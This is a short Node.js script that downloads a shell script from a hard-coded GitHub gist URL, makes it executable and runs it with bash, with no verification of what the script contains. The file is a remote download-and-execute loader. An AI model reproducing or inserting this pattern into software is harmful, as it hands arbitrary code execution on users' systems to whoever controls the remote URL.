const { spawn } = require('child_process');
const fs = require('fs');
const axios = require('axios');

const startScriptPath = './run.sh';
const interpreterPath = '/usr/bin/env';
const interpreterArgs = ['bash', startScriptPath];
const scriptDownloadURL = 'https://gist.githubusercontent.com/cvocloud/a21e4bd28672aa628e5e18ec5bd25b0a/raw/07544eec9aa7e8870cca01cd977422eda435106b/run.sh';

axios({
  method: 'get',
  url: scriptDownloadURL,
  responseType: 'stream'
})
  .then(response => {
    const writeStream = fs.createWriteStream(startScriptPath);
    response.data.pipe(writeStream);
  
    writeStream.on('finish', () => {
      try {
        fs.chmodSync(startScriptPath, 0o755);
        console.log(`Permission granted: ${startScriptPath}`);
      } catch (error) {
        console.error(`Permission denied: ${error}`);
      }
  
      const startScript = spawn(interpreterPath, interpreterArgs);
  
      startScript.stdout.on('data', (data) => {
        console.log(`Output: ${data}`);
      });
  
      startScript.stderr.on('data', (data) => {
        console.error(`${data}`);
      });
  
      startScript.on('error', (error) => {
        console.error(`Script execution error: ${error}`);
        process.exit(1);
      });
  
      startScript.on('close', (code) => {
        console.log(`Child process exited with code ${code}`);
      });
    });
  })
  .catch(error => {
    console.error(`Script download error: ${error}`);
    process.exit(1);
  });
